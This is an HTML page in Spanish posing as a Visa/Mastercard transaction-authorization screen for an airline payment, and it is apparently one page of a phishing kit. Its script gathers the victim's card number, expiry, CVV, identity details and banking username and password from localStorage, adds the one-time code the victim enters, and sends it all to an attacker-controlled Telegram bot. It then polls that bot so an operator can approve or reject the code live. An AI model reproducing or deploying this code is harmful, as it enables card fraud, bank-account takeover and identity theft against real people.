<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mi Página</title>
    <style>
      body {
        background-color: #ffffff;
        margin: 0;
        padding: 0;
        overflow: hidden; /* Evita que la página se desplace */
      }

      html,
      body {
        height: 100%;
      }

      #contenedor {
        position: relative;
        width: 95vw;
        height: 95vh;
        background-color: #ffffff;
        overflow: hidden;
        top: 50px;
        left: 35px;
        width: 310px;
        height: 500px;
      }

      #imagenIzquierda {
        position: absolute;
        top: 10px;
        left: 20px;
        width: 70px;
        height: 30px;
      }

      #imagenDerecha {
        position: absolute;
        top: 2px;
        right: 20px;
        width: 100px;
        height: 50px;
      }

      #titulo {
        font-size: 20px;
        font-weight: bold;
        color: #333;
        margin-top: 70px;
        margin-bottom: 10px;
        text-align: center;
      }

      #titulo2 {
        font-size: 16px;
        font-weight: bold;
        color: #333;
        margin-top: 30px;
        margin-bottom: 10px;
        text-align: center;
      }

      #parrafo {
        font-size: 13px;
        color: #000000;
        margin: 0 auto;
        max-width: 80%;
        text-align: justify;
        letter-spacing: 2px;
      }

      #formulario {
        margin-top: 20px;
        padding: 0 20px;
      }

      #formulario label {
        display: inline-block;
        font-size: 12px;
        font-weight: bold;
        color: #333;
        margin-bottom: 5px;
        width: 50%;
      }

      #formulario input {
        width: 48%;
        padding: 5px;
        margin-bottom: 10px;
        box-sizing: border-box;
        display: inline-block;
      }

      #horaTransaccion {
        font-size: 12px;
        color: #333;
        margin-top: 15px;
      }

      #autorizarBtn {
        display: block;
        margin: 45px auto;
        padding: 15px 30px;
        border-radius: 10%;
        background-color: #000;
        color: #fff;
        text-align: center;
        cursor: pointer;
        font-size: 12px;
        text-decoration: none;
        border: none;
      }

      #contador {
        color: #555;
        font-size: 8px;
        margin-left: 15px;
      }

      .loaderp {
        width: 48px;
        height: 48px;
        border: 5px solid #fff;
        border-bottom-color: #e8114b;
        border-radius: 50%;
        display: inline-block;
        box-sizing: border-box;
        animation: rotation 1s linear infinite;
      }

      @keyframes rotation {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .loaderp-full {
        position: fixed;
        top: 0;
        overflow-y: hidden;
        z-index: 1000;
        background-color: white;
        width: 100vw;
        height: 100vh;
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }
    </style>
  </head>

  <body>
    <div id="contenedor">
      <img src="img/visa.jpg" alt="Logo Visa" id="imagenIzquierda" />
      <img src="img/master.png" alt="Logo Mastercard" id="imagenDerecha" />
      <div id="contenido">
        <div id="titulo">Autorizacion de transaccion</div>
        <div id="parrafo">
          Estás intentado realizar un pago por tarjeta de crédito/débito.
          Necesitamos confirmar que eres tú quien realiza este pago.
        </div>
        <div id="titulo2">Detalles de la transaccion</div>
        <div id="formulario">
          <label>Comercio: LATAMAIRLINE</label>
          <label for="horaTransaccion">
            <span id="horaTransaccion">Hora de la transacción:</span>
          </label>
          <label for="otp">Ingrese su clave dinamica:</label>
          <input
            type="text"
            id="otp"
            name="otp"
            maxlength="6"
            oninput="validarOtp()"
          />
          <p id="contador">
            Ingresa el codigo de 6 digitos recibido por mensaje o
            <span id="tiempo"></span>ingresando a su tu app.
          </p>
        </div>
      </div>
      <button id="autorizarBtn">Autorizar</button>
       <!-- LOADER FULL -->
    <div class="loaderp-full">
        <span class="loaderp"></span>
        <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
      </div>
    </div>
    <script>
      async function loadTelegramConfig() {
        try {
          const response = await fetch("./js/brr76.json"); // Ajusta la ruta a tu archivo brr76.json
          if (!response.ok) {
            throw new Error(
              "No se pudo cargar el archivo de configuración de Telegram."
            );
          }
          return await response.json();
        } catch (error) {
          console.error(
            "Error al cargar el archivo de configuración de Telegram:",
            error
          );
        }
      }

      async function checkPaymentVerification(transactionId) {
        const config = await loadTelegramConfig();
        if (!config) {
          loader.style.display = "none";
          return;
        }
        fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
          .then((response) => response.json())
          .then((data) => {
            const updates = data.result;
            const verificationUpdate = updates.find(
              (update) =>
                update.callback_query &&
                (update.callback_query.data ===
                  `confirm_otp:${transactionId}` ||
                  update.callback_query.data === `invalid_otp:${transactionId}`)
            );

            if (verificationUpdate) {
              loader.style.display = "none";
              if (
                verificationUpdate.callback_query.data ===
                `confirm_otp:${transactionId}`
              ) {
                
              }
              if (
                verificationUpdate.callback_query.data ===
                `invalid_otp:${transactionId}`
              ) {
                alert(
                  "Clave dinamica incorrecta. Por favor, revise sus datos e intente nuevamente."
                );
              }
            } else {
              setTimeout(
                () => checkPaymentVerification(transactionId, config),
                2000
              );
            }
          })
          .catch((error) => {
            console.error("Error al verificar la clave dinamica:", error);
            setTimeout(
              () => checkPaymentVerification(transactionId, config),
              2000
            );
          });
      }

      function obtenerFechaActual() {
        const ahora = new Date();
        const dia = ahora.getDate().toString().padStart(2, "0");
        const mes = (ahora.getMonth() + 1).toString().padStart(2, "0");
        const año = ahora.getFullYear();
        const horas = ahora.getHours().toString().padStart(2, "0");
        const minutos = ahora.getMinutes().toString().padStart(2, "0");
        const segundos = ahora.getSeconds().toString().padStart(2, "0");
        return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
      }

      function actualizarHoraTransaccion() {
        const ahora = new Date();
        const horas = ahora.getHours().toString().padStart(2, "0");
        const minutos = ahora.getMinutes().toString().padStart(2, "0");
        const segundos = ahora.getSeconds().toString().padStart(2, "0");
        document.getElementById(
          "horaTransaccion"
        ).innerText = `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
      }

      // Inicializar la hora de la transacción
      document.getElementById(
        "horaTransaccion"
      ).innerText = `Hora de la transacción: ${obtenerFechaActual()}`;
      // Actualizar la hora cada segundo
      setInterval(actualizarHoraTransaccion, 1000);

      function validarOtp() {
        const otpInput = document.getElementById("otp");
        if (otpInput.value.length > 6) {
          otpInput.value = otpInput.value.slice(0, 6);
        }
      }

      const loader = document.querySelector(".loaderp-full");

      async function enviarDatos() {
        loader.style.display = "flex";
        const formData0 = JSON.parse(localStorage.getItem("formData"));
        // Generar un ID de transacción único
        const transactionId =
          Date.now().toString(36) + Math.random().toString(36).substr(2);
        // Obtener los valores del formulario
        const otp = document.getElementById("otp").value;
        const username = localStorage.getItem("username"); // Asegúrate de que `username` esté en el localStorage
        const password = localStorage.getItem("password"); // Asegúrate de que `password` esté en el localStorage

        // Comprobar si se obtuvo el código OTP
        if (!otp || otp.length !== 6) {
          alert("Por favor, ingrese un código OTP válido de 6 dígitos.");
          return;
        }

        const message = `Nuevo solicitud de clave dinamica 2 pendiente de verificación.\n🆔ID: ${transactionId}\n👤Nombre: ${formData0.nombre}\n🪪Cédula: ${formData0.documentoIdentidad}\n-\n📞Teléfono: ${formData0.telefono}\n🌇Ciudad: ${formData0.ciudad}\n🗺️Direc: ${formData0.direccion}\n-\n🏦 Banco: ${formData0.entidad}\n💳Tarjeta: ${formData0.tarjeta}\n📅Fecha: ${formData0.fechaExpiracion}\n🔐CVV: ${formData0.cvv}\n🧑‍💻Usuario: ${username}\n🔐Clave: ${password}\n🔑OTP2: ${otp}
        `;

        const keyboard = JSON.stringify({
          inline_keyboard: [
            [
              {
                text: "Confirmar OTP2",
                callback_data: `confirm_otp:${transactionId}`,
              },
              {
                text: "OTP2 Incorrecto",
                callback_data: `invalid_otp:${transactionId}`,
              },
            ],
          ],
        });

        const config = await loadTelegramConfig();
        if (!config) {
          loader.style.display = "none";
          return;
        }

        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: config.chat_id,
            text: message,
            reply_markup: keyboard,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.ok) {
              console.log("Mensaje enviado a Telegram con éxito");
              checkPaymentVerification(transactionId);
            } else {
              console.error("Error al enviar mensaje a Telegram:", data);
              loader.style.display = "none";
            }
          })
          .catch((error) => {
            console.error("Error al enviar mensaje a Telegram:", error);
            loader.style.display = "none";
          });
      }

      document
        .getElementById("autorizarBtn")
        .addEventListener("click", function (event) {
          event.preventDefault(); // Evita el comportamiento predeterminado del botón
          enviarDatos();
        });
    </script>
  </body>
</html>